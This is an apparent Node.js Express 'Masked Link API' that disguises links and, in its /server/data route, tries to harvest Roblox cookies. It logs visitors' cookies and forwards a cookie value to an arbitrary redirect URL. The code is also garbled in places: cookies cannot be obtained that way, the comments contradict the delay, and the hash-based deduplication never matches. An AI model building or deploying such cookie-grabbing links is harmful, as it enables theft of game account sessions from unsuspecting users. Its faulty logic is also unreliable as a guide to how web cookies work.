const express = require('express');
const validUrl = require('valid-url');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;
const path = require("path");
const cookieParser = require('cookie-parser');
const axios = require('axios');
const bcrypt = require('bcrypt');
const links = {};

app.use(express.json());
app.use(cors());
app.use(cookieParser());
// Serve static assets from the "public" directory
app.use(express.static(path.join(__dirname, "public")));

app.get('/', (req, res) => {
  res.send('Welcome to the Masked Link API!');
});

app.get('/server/data/:code', async (req, res) => {
  const { code } = req.params || {};
  const { l } = req.query;
  const link = links[code] || links[l];
  
  if (!link) {
    return res.status(404).json({ error: 'Link not found' });
  }

  const { originalUrl } = link;
  const robloxUrl = 'https://roblox.com'; // replace with your desired roblox URL
  const redirectUrl = originalUrl; // use original URL as the redirect URL

  try {
    // Make a request to the Roblox site to get its cookies
    await axios.get(robloxUrl, { withCredentials: true });

    // Log cookies after 1 second delay to ensure they're available
    setTimeout(() => {
      console.log(req.cookies);

      // If the cookie exists, add it to the redirect URL
      if (req.cookies && req.cookies.myCookie) {
        const cookieValue = req.cookies.myCookie;
        const encodedCookie = encodeURIComponent(cookieValue);
        res.redirect(`${redirectUrl}?myCookie=${encodedCookie}`);
      } else {
        res.redirect(redirectUrl);
      }
    }, 2000); // 1 second delay before logging cookies
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});



app.post('/links', async (req, res) => {
  const { url } = req.body;
  if (!url) {
    return res.status(400).json({ error: 'Missing URL' });
  }
  if (!validUrl.isUri(url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  const hashedUrl = await bcrypt.hash(url, 10);
  const link = Object.values(links).find(l => l.hashedUrl === hashedUrl);
  if (link) {
    return res.status(200).json({ code: link.code, shortUrl: `https://masked-api.onrender.com/server/data/${link.code}` });
  } else {
    const code = Math.floor(Math.random() * 1000000);
    const newLink = { code, originalUrl: url, hashedUrl };
    links[code] = newLink;
    return res.status(200).json({ code: newLink.code, shortUrl: `https://masked-api.onrender.com/server/data/${code}` });
  }
});


app.get('/links', async (req, res) => {
  res.status(200).json(links);
});

app.get('/:code', async (req, res) => {
  const { code } = req.params;

  const link = links[code];

  if (link) {
    return res.redirect(link.originalUrl);
  }

  return res.status(404).json({ error: 'Link not found' });
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});